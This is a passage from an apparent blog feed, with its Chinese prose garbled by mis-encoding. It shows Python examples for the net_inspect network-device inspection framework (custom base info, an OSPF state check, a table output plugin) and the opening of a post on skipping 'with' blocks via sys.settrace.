·çš„å†™æ³•æ˜¯å¦æœ‰ç‚¹éº»çƒ¦ï¼Œå¹¶ä¸”ä¸åˆ©äºå¤ç”¨å‘¢ï¼Ÿæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼å‘¢ï¼Ÿ</p><h3 id="æ–°å¢åŸºç¡€ä¿¡æ¯"><a href="#æ–°å¢åŸºç¡€ä¿¡æ¯" class="headerlink" title="æ–°å¢åŸºç¡€ä¿¡æ¯"></a>æ–°å¢åŸºç¡€ä¿¡æ¯</h3><p>æˆ‘ä»¬å¯ä»¥åœ¨<code>base_info</code>ä¸­æ–°å¢ä¸€ä¸ª<code>clock</code>å­—æ®µï¼Œç„¶ååªéœ€è¦è°ƒç”¨è¿™ä¸ª<code>clock</code>å±æ€§å°±å¯ä»¥äº†ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> net_inspect <span class="hljs-keyword">import</span> NetInspect, EachVendorDeviceInfo, BaseInfo, Device</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppendClock</span>(<span class="hljs-params">BaseInfo</span>):</span></span><span class="line">    clock: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># å·¡æ£€æ—¶é—´</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EachVendorWithClock</span>(<span class="hljs-params">EachVendorDeviceInfo</span>):</span></span><span class="line"></br></span><span class="line">    base_info_class = AppendClock  <span class="hljs-comment"># åŸºæœ¬ä¿¡æ¯ç±»</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_huawei_vrp_baseinfo_2</span>(<span class="hljs-params">self, device: Device, info: AppendClock</span>):</span></span><span class="line">        <span class="hljs-comment"># æ·»åŠ do_&lt;vendor_platform&gt;_baseinfo_&lt;something&gt;æ–¹æ³•ï¼Œå¯ä»¥è‡ªåŠ¨è¿è¡Œ</span></span><span class="line">        <span class="hljs-keyword">with</span> device.search_cmd(<span class="hljs-string">&#x27;display clock&#x27;</span>) <span class="hljs-keyword">as</span> cmd:</span><span class="line">            <span class="hljs-keyword">if</span> cmd.parse_result:</span><span class="line">                row = cmd.parse_result[<span class="hljs-number">0</span>]</span><span class="line">                info.clock = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;year&quot;</span>]&#125;</span>-<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;month&quot;</span>]&#125;</span>-<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;day&quot;</span>]&#125;</span> <span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;time&quot;</span>]&#125;</span>&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_hp_comware_baseinfo_2</span>(<span class="hljs-params">self, device: Device, info: AppendClock</span>):</span></span><span class="line">        <span class="hljs-keyword">with</span> device.search_cmd(<span class="hljs-string">&#x27;display clock&#x27;</span>) <span class="hljs-keyword">as</span> cmd:</span><span class="line">            <span class="hljs-keyword">if</span> cmd.parse_result:</span><span class="line">                row = cmd.parse_result[<span class="hljs-number">0</span>]</span><span class="line">                info.clock = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;year&quot;</span>]&#125;</span>-<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;month&quot;</span>]&#125;</span>-<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;day&quot;</span>]&#125;</span> <span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;time&quot;</span>]&#125;</span>&#x27;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    net = NetInspect()</span><span class="line">    net.set_plugins(input_plugin=<span class="hljs-string">&#x27;console&#x27;</span>)</span><span class="line">    net.set_base_info_handler(EachVendorWithClock)  <span class="hljs-comment"># è®¾ç½®è·å–è®¾å¤‡åŸºæœ¬ä¿¡æ¯çš„å¤„ç†ç±»</span></span><span class="line">    net.set_external_templates(<span class="hljs-string">&#x27;local_templates&#x27;</span>)</span><span class="line">    net.run(path=<span class="hljs-string">&#x27;log&#x27;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;total devices:&#x27;</span>, <span class="hljs-built_in">len</span>(net.cluster.devices))</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> net.cluster.devices:</span><span class="line">        info = device.info  <span class="hljs-comment"># type: AppendClock</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; | &#x27;</span>.join([info.hostname, info.clock]))</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">total devices: 3</span><span class="line">Switch_A | 2021-03-19 10:23:08</span><span class="line">Switch_B | 2021-03-19 10:24:17</span><span class="line">Switch_C | 2021-03-19 10:32:17</span></code></pre></div></div><p>è¾“å‡ºçš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨<code>base_info</code>ä¸­æ–°å¢äº†ä¸€ä¸ª<code>clock</code>å­—æ®µï¼Œç„¶ååªéœ€è¦è°ƒç”¨è¿™ä¸ª<code>clock</code>å±æ€§å°±å¯ä»¥äº†ã€‚è¿™æ ·çš„åšæ³•å¤ç”¨æ€§å¼ºï¼Œåç»­å†æƒ³è¦è·å–è®¾å¤‡çš„æ—¶é—´çš„æ—¶å€™ï¼Œåªéœ€è¦è°ƒç”¨<code>clock</code>å±æ€§å³å¯ã€‚</p><h3 id="è‡ªå®šä¹‰åˆ†æä¿¡æ¯"><a href="#è‡ªå®šä¹‰åˆ†æä¿¡æ¯" class="headerlink" title="è‡ªå®šä¹‰åˆ†æä¿¡æ¯"></a>è‡ªå®šä¹‰åˆ†æä¿¡æ¯</h3><p>å®Œæˆäº†æ•°æ®çš„è§£æè°ƒç”¨ï¼Œä¸‹é¢è¿˜éœ€è¦å¯¹è®¾å¤‡è¿›è¡Œåˆ†æï¼Œæ¯”å¦‚åˆ¤æ–­ç”µæºã€é£æ‰‡æ˜¯å¦æ•…éšœï¼Œcpuã€memoryåˆ©ç”¨ç‡æ˜¯å¦è¿‡é«˜ç­‰ã€‚</p><p>å½“<code>net_inspect</code>ä¸­æ²¡æœ‰éœ€è¦çš„åˆ†ææ¨¡å—æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰åˆ†ææ¨¡å—ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬å†™ä¸€ä¸ªæ£€æŸ¥OSPFé‚»å±…çŠ¶æ€çš„åˆ†ææ¨¡å—</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TYPE_CHECKING</span><span class="line"><span class="hljs-keyword">from</span> net_inspect <span class="hljs-keyword">import</span> NetInspect, vendor</span><span class="line"><span class="hljs-keyword">from</span> net_inspect.analysis_plugin <span class="hljs-keyword">import</span> analysis, AnalysisPluginAbc</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> TYPE_CHECKING:</span><span class="line">    <span class="hljs-keyword">from</span> net_inspect.analysis_plugin <span class="hljs-keyword">import</span> TemplateInfo</span><span class="line">    <span class="hljs-keyword">from</span> net_inspect.domain <span class="hljs-keyword">import</span> AnalysisResult</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnalysisPluginWithOSPFStatus</span>(<span class="hljs-params">AnalysisPluginAbc</span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;OPSF status çŠ¶æ€ä¸èƒ½ä¸ºInit&quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @analysis.vendor(<span class="hljs-params">vendor.Huawei</span>)</span></span><span class="line"><span class="hljs-meta">    @analysis.template_key(<span class="hljs-params"><span class="hljs-string">&#x27;huawei_vrp_display_ospf_peer_brief.textfsm&#x27;</span>, [<span class="hljs-string">&#x27;neighbor&#x27;</span>, <span class="hljs-string">&#x27;state&#x27;</span>]</span>)</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">huawei_vrp</span>(<span class="hljs-params">template: TemplateInfo, result: AnalysisResult</span>):</span></span><span class="line">        <span class="hljs-string">&quot;&quot;&quot;åä¸ºçŠ¶æ€æ£€æŸ¥&quot;&quot;&quot;</span></span><span class="line">        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> template[<span class="hljs-string">&#x27;display ospf peer brief&#x27;</span>]:</span><span class="line">            <span class="hljs-keyword">if</span> row[<span class="hljs-string">&#x27;state&#x27;</span>].lower() == <span class="hljs-string">&#x27;init&#x27;</span>:</span><span class="line">                result.add_warning(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;row[<span class="hljs-string">&quot;neighbor&quot;</span>]&#125;</span> is in init state&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    net = NetInspect()</span><span class="line">    net.set_plugins(input_plugin=<span class="hljs-string">&#x27;console&#x27;</span>)</span><span class="line">    net.run(path=<span class="hljs-string">&#x27;log&#x27;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;total devices:&#x27;</span>, <span class="hljs-built_in">len</span>(net.cluster.devices))</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> net.cluster.devices:</span><span class="line">        ospf_status = device.analysis_result.get(<span class="hljs-string">&#x27;ospf status&#x27;</span>)</span><span class="line">        warning_list = []</span><span class="line">        <span class="hljs-keyword">for</span> alarm <span class="hljs-keyword">in</span> ospf_status:</span><span class="line">            <span class="hljs-keyword">if</span> alarm.is_warning:</span><span class="line">                warning_list.append(alarm.message)</span><span class="line"></br></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; | &#x27;</span>.join([device.info.hostname, <span class="hljs-string">&#x27;, &#x27;</span>.join(warning_list)]))</span></code></pre></div></div><p>output:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">total devices: 3</span><span class="line">Switch_A | 24.42.254.20 is in init state</span><span class="line">Switch_B |</span><span class="line">Switch_C |</span></code></pre></div></div><p>è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªå¯é‡å¤åˆ©ç”¨çš„åˆ†ææ¨¡å—ï¼Œåç»­åœ¨æƒ³è¦æ£€æŸ¥OSPFé‚»å±…çŠ¶æ€çš„æ—¶å€™ï¼Œåªéœ€è¦è°ƒç”¨è¿™ä¸ªæ¨¡å—å³å¯ã€‚</p><p>è¿™é‡Œçš„æ¡ˆä¾‹åªæ·»åŠ äº†<code>Huawei</code>è¿™ä¸€ä¸ªå‚å®¶çš„åˆ†ææ–¹æ³•ï¼Œå…¶ä»–å‚å®¶çš„åˆ†ææ–¹æ³•å¤§å®¶å¯ä»¥è‡ªè¡Œæ·»åŠ ã€‚</p><p>ç¼–å†™è¿™ä¸ªéœ€è¦æ³¨æ„ï¼š</p><ol><li><code>@analysis.template_key</code>ä¸­çš„<code>templates</code>åç§°éœ€è¦å®Œæ•´åŒ…å«åç¼€åã€‚</li><li>ç±»æ–¹æ³•ä¸éœ€è¦<code>self</code>è¿™ä¸ªå…³é”®å­—ã€‚</li><li>ç»“æœåŠ å…¥åˆ°<code>result</code>ä¸­å³å¯ï¼Œä¸éœ€è¦è¿”å›å€¼ã€‚</li><li>æ•´ä¸ªè¿‡ç¨‹ä¸ç”¨å•ç‹¬è®¾ç½®ï¼Œæ‰€æœ‰ä¿¡æ¯ä¼šç›´æ¥å†™å…¥<code>analysis</code>å˜é‡ä¸­ã€‚</li><li>ç±»æ³¨é‡Šå’Œæ–¹æ³•æ³¨é‡Šå¿…é¡»è¦å†™ï¼Œå› ä¸ºä¼šç”¨åˆ°è¿™ä¸ªæ³¨é‡Šä½œä¸ºåˆ†æç»“æœçš„æ ‡é¢˜ã€‚</li></ol><h3 id="è‡ªå®šä¹‰è¾“å‡ºæ¨¡å—"><a href="#è‡ªå®šä¹‰è¾“å‡ºæ¨¡å—" class="headerlink" title="è‡ªå®šä¹‰è¾“å‡ºæ¨¡å—"></a>è‡ªå®šä¹‰è¾“å‡ºæ¨¡å—</h3><p>å®Œæˆäº†æ•°æ®çš„åˆ†æåï¼Œéœ€è¦å¯¹ç»“æœè¿›è¡Œè°ƒç”¨ï¼Œå¯ä»¥ç›´æ¥ä»¥å†™è„šæœ¬çš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰è¾“å‡ºæ¨¡å—ã€‚</p><p>è‡ªå®šä¹‰è¾“å‡ºæ¨¡å—çš„æ–¹å¼æ–¹ä¾¿äºŒæ¬¡è°ƒç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬å†™ä¸€ä¸ªè¾“å‡ºtableçš„ä¾‹å­ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> net_inspect <span class="hljs-keyword">import</span> NetInspect, OutputPluginAbstract</span><span class="line"><span class="hljs-keyword">from</span> rich.table <span class="hljs-keyword">import</span> Table</span><span class="line"><span class="hljs-keyword">from</span> rich.console <span class="hljs-keyword">import</span> Console</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span>(<span class="hljs-params">OutputPluginAbstract</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        console = Console()</span><span class="line"></br></span><span class="line">        table = Table(title=self.args.output_params.get(</span><span class="line">            <span class="hljs-string">&#x27;title&#x27;</span>), show_lines=<span class="hljs-literal">False</span>)</span><span class="line">        table.add_column(<span class="hljs-string">&#x27;name&#x27;</span>, justify=<span class="hljs-string">&#x27;center&#x27;</span>)</span><span class="line">        table.add_column(<span class="hljs-string">&#x27;ip&#x27;</span>, justify=<span class="hljs-string">&#x27;center&#x27;</span>)</span><span class="line">        table.add_column(<span class="hljs-string">&#x27;model&#x27;</span>, justify=<span class="hljs-string">&#x27;center&#x27;</span>)</span><span class="line">        table.add_column(<span class="hljs-string">&#x27;version&#x27;</span>, justify=<span class="hljs-string">&#x27;center&#x27;</span>)</span><span class="line">        table.add_column(<span class="hljs-string">&#x27;power&#x27;</span>, justify=<span class="hljs-string">&#x27;center&#x27;</span>)</span><span class="line">        table.row_styles = [<span class="hljs-string">&#x27;green&#x27;</span>]</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> self.args.devices:</span><span class="line">            table.add_row(</span><span class="line">                device.info.hostname,</span><span class="line">                device.info.ip,</span><span class="line">                device.info.model,</span><span class="line">                device.info.version,</span><span class="line">                <span class="hljs-string">&#x27;Abnormal&#x27;</span> <span class="hljs-keyword">if</span> device.info.analysis.power <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;Normal&#x27;</span></span><span class="line">            )</span><span class="line"></br></span><span class="line">        console.<span class="hljs-built_in">print</span>(table)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line"></br></span><span class="line">    net = NetInspect()</span><span class="line">    net.set_plugins(input_plugin=<span class="hljs-string">&#x27;console&#x27;</span>, output_plugin=Output)</span><span class="line">    cluster = net.run(<span class="hljs-string">&#x27;log&#x27;</span>, output_plugin_params=&#123;</span><span class="line">                    <span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-string">&#x27;è®¾å¤‡ä¿¡æ¯&#x27;</span>&#125;)</span></code></pre></div></div><p>output:</p><p><img src="/2022/09/05/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A1%86%E6%9E%B6net-inspect%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python -with- ä»£ç å—è·³è¿‡</title>
      <link href="/2022/08/24/python-with-%E4%BB%A3%E7%A0%81%E5%9D%97%E8%B7%B3%E8%BF%87/"/>
      <url>/2022/08/24/python-with-%E4%BB%A3%E7%A0%81%E5%9D%97%E8%B7%B3%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<ul><li>å‚è€ƒ<a href="https://stackoverflow.com/questions/12594148/skipping-execution-of-with-block">è¿™ç¯‡æ–‡ç« </a></li></ul><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œpythonä¸­çš„withä»£ç å—æ˜¯æ— æ³•è·³è¿‡çš„ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">with</span> EXPR <span class="hljs-keyword">as</span> VAR:</span><span class="line">    BLOCK</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">mgr = (EXPR)</span><span class="line">exit = <span class="hljs-built_in">type</span>(mgr).__exit__  <span class="hljs-comment"># Not calling it yet</span></span><span class="line">value = <span class="hljs-built_in">type</span>(mgr).__enter__(mgr)</span><span class="line">exc = <span class="hljs-literal">True</span></span><span class="line"><span class="hljs-keyword">try</span>:</span><span class="line">    <span class="hljs-keyword">try</span>:</span><span class="line">        VAR = value  <span class="hljs-comment"># Only if &quot;as VAR&quot; is present</span></span><span class="line">        BLOCK</span><span class="line">    <span class="hljs-keyword">except</span>:</span><span class="line">        <span class="hljs-comment"># The exceptional case is handled here</span></span><span class="line">        exc = <span class="hljs-literal">False</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exit(mgr, *sys.exc_info()):</span><span class="line">            <span class="hljs-keyword">raise</span></span><span class="line">        <span class="hljs-comment"># The exception is swallowed if exit() returns true</span></span><span class="line"><span class="hljs-keyword">finally</span>:</span><span class="line">    <span class="hljs-comment"># The normal and non-local-goto cases are handled here</span></span><span class="line">    <span class="hljs-keyword">if</span> exc:</span><span class="line">        exit(mgr, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)</span></code></pre></div></div><p>ä½†æ˜¯æˆ‘ä»¬æœ‰æ—¶å€™åˆå¸Œæœ›èƒ½è¿‡å¤„ç†è·³è¿‡çš„æƒ…å†µã€‚è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><h2 id="with-çš„ä½œç”¨åŸç†"><a href="#with-çš„ä½œç”¨åŸç†" class="headerlink" title="with çš„ä½œç”¨åŸç†"></a>with çš„ä½œç”¨åŸç†</h2><p>æƒ³è¦ä½¿ç”¨withï¼Œå¿…é¡»è¿”å›ç»“æœï¼ˆä¹Ÿå°±æ˜¯VARï¼‰è¿™ä¸ªå˜é‡çš„ç±»å¿…é¡»åŒ…å«<code>__enter__</code>å’Œ<code>__exit__</code>ä¸¤ä¸ªæ–¹æ³•ã€‚</p><h2 id="æ–¹æ³•ä¸€ï¼šé€šè¿‡traceæ¥è·³è¿‡"><a href="#æ–¹æ³•ä¸€ï¼šé€šè¿‡traceæ¥è·³è¿‡" class="headerlink" title="æ–¹æ³•ä¸€ï¼šé€šè¿‡traceæ¥è·³è¿‡"></a>æ–¹æ³•ä¸€ï¼šé€šè¿‡traceæ¥è·³è¿‡</h2><p>åŸå‹ä¸º</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> sys</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SkipWithBlock</span>(<span class="hljs-params">Exception</span>):</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SkipContextManager</span>:</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, skip</span>):</span></span><span class="line">        self.skip = skip</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> self.skip:</span><span class="line">            sys.settrace(<span class="hljs-keyword">lambda</span> *args, **keys: <span class="hljs-literal">None</span>)</span><span class="line">            frame = sys._getframe(<span class="hljs-number">1</span>)</span><span class="line">            frame.f_trace = self.trace</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trace</span>(<span class="hljs-params">self, frame, event, arg</span>):</span></span><span class="line">        <span class="hljs-keyword">raise</span> SkipWithBlock()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span>(<span class="hljs-params">self, <span class="hljs-built_in">type</span>, value, traceback</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><span class="line">            <span class="hljs-keyword">return</span>  <span class="hljs-comment"># No exception</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>, SkipWithBlock):</span><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># Suppress special SkipWithBlock exception</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">with</span> SkipContextManager(skip=<span class="hljs-literal">True</span>):    </span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;In the with block&#x27;</span>)  <span class="hljs-comment"># Won&#x27;t be called</span></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Out of the with block&#x27;</span>)</span></code></pre></div></div><h3 id="æ›¿æ¢-contextmanager-è£…é¥°å™¨"><a href="#æ›¿æ¢-contextmanager-è£…é¥°å™¨" class="headerlink" title="æ›¿æ¢ contextmanager è£…é¥°å™¨"></a>æ›¿æ¢ contextmanager è£…é¥°å™¨</h3><p>å¯¹äºä¸Šé¢çš„åŸå‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è£…é¥°å™¨æ¥æ›¿æ¢ï¼š</p><p>æ›¿æ¢ contextmanager çš„æ–¹æ³•ä¸º:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> sys</span><span class="line"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> _GeneratorContextManager</span><span class="line"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SkipWithBlock</span>(<span class="hljs-params">Exception</span>):</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_ContextManager</span>(<span class="hljs-params">_GeneratorContextManager</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">del</span> self.args, self.kwds, self.func</span><span class="line">        <span class="hljs-keyword">try</span>:</span><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-built_in">next</span>(self.gen)</span><span class="line">        <span class="hljs-keyword">except</span> StopIteration:</span><span class="line">            sys.settrace(<span class="hljs-keyword">lambda</span> *args, **keys: <span class="hljs-literal">None</span>)</span><span class="line">            frame = sys._getframe(<span class="hljs-number">1</span>)</span><span class="line">            frame.f_trace = self.trace</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trace</span>(<span class="hljs-params">self, frame, event, arg</span>):</span></span><span class="line">        <span class="hljs-keyword">raise</span> SkipWithBlock()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span>(<span class="hljs-params">self, <span class="hljs-built_in">type</span>, value, traceback</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><span class="line">            <span class="hljs-keyword">try</span>:</span><span class="line">                <span class="hljs-built_in">next</span>(self.gen)</span><span class="line">            <span class="hljs-keyword">except</span> StopIteration:</span><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><span class="line">            <span class="hljs-keyword">else</span>:</span><span class="line">                <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;generator didn&#x27;t stop&quot;</span>)</span><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>, SkipWithBlock):</span><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><span class="line">                value = <span class="hljs-built_in">type</span>()</span><span class="line">            <span class="hljs-keyword">try</span>:</span><span class="line">                self.gen.throw(<span class="hljs-built_in">type</span>, value, traceback)</span><span class="line">            <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> exc:</span><span class="line">                <span class="hljs-keyword">return</span> exc <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> value</span><span class="line">            <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> exc:</span><span class="line">                <span class="hljs-keyword">if</span> exc <span class="hljs-keyword">is</span> value:</span><span class="line">                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> <span class="hljs-keyword">is</span> StopIteration <span class="hljs-keyword">and</span> exc.__cause__ <span class="hljs-keyword">is</span> value:</span><span class="line">                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><span class="line">                <span class="hljs-keyword">raise</span></span><span class="line">            <span class="hljs-keyword">except</span>:</span><span class="line">                <span class="hljs-keyword">if</span> sys.exc_info()[<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> value:</span><span class="line">                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><span class="line">                <span class="hljs-keyword">raise</span></span><span class="line">            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;generator didn&#x27;t stop after throw()&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">contextmanager</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;è¿™ä¸ªcontextmanagerå¯ä»¥åœ¨æ²¡æœ‰yieldçš„æ—¶å€™ï¼Œä¸»åŠ¨è·³è¿‡ä»£ç å—&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-meta">    @wraps(<span class="hljs-params">func</span>)</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">helper</span>(<span class="hljs-params">*args, **kwds</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> _ContextManager(func, args, kwds)</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">return</span> helper</span></code></pre></div></div><p>è¿™ä¹ˆåšä¼šæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ— æ³•åœ¨IDEä¸­è·å–VARçš„å±æ€§ï¼Œä¸å¥½ç”¨ï¼Œè€Œä¸”æ— æ³•åšåˆ°ä¸€ä¸ªå‡½æ•°åŒæ—¶åŒ…å«ç›´æ¥è°ƒç”¨å’Œé—´æ¥çš„withçš„èƒ½åŠ›ã€‚</p><h3 id="åˆ©ç”¨ç‰¹æ®Šçš„ç±»"><a href="#åˆ©ç”¨ç‰¹æ®Šçš„ç±»" class="headerlink" 